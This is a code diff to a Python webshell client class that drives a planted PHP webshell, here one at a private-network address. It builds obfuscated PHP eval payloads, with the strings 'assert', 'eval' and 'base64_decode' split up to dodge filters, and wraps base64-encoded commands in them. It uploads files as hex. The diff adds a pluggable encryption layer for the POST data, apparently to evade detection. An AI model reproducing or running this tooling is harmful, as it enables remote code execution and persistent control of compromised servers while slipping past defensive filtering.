@@ -2,6 +2,8 @@ import requests
 import re
 import base64
 import binascii
+import importlib
+import urllib
 
 class Shell:
     """Shell交互数据发送接收类
@@ -15,6 +17,8 @@ class Shell:
         self.pwd = pwd
         self.plugin = plugin
         self.method = method
+        self.plugin_module = None
+        self.load_plugin()
         self.headers = {
             'Content-Type': 'application/x-www-form-urlencoded',
         }
@@ -27,6 +31,9 @@ class Shell:
         self.get_sys_info()
         self.basic_set()
 
+    def load_plugin(self):
+        self.plugin_module = importlib.import_module('plugins.%s' % self.plugin)
+
     def post_data(self, data):
         """post发送数据"""
         resp = requests.post(self.url, data=data, headers=self.headers)
@@ -35,15 +42,14 @@ class Shell:
     def generate_post_data(self, functional_code, filename=''):
         """由功能性代码构造post数据"""
         b64_functional_code = bytes.decode(base64.b64encode(str.encode(functional_code)))
-        data = {
-            self.pwd: r"""array_map("ass"."ert",array("ev"."Al(\"\\\$xx=\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('""" + \
-                      b64_functional_code + \
-                      r"""'));\");"));"""
-        }
+        data = r"""array_map("ass"."ert",array("ev"."Al(\"\\\$xx=\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('""" + \
+                b64_functional_code + \
+                r"""'));\");"));"""
         if filename:
             with open(filename, 'rb') as f:
                 content = f.read()
-            data['z1'] = bytes.decode(binascii.hexlify(content)).upper()
+            data += '&z1=%s' % bytes.decode(binascii.hexlify(content)).upper()
+        data = '%s=%s' % (self.pwd, self.plugin_module.encrypt(data))
         return data
 
     def basic_set(self):
@@ -161,6 +167,7 @@ class Shell:
             if match:
                 return {'upload': match.group(1)}
         return resp.content.decode(self.coding)
+
 
 if __name__ == '__main__':
     shell = Shell('http://192.168.4.170/a.php', 'a')
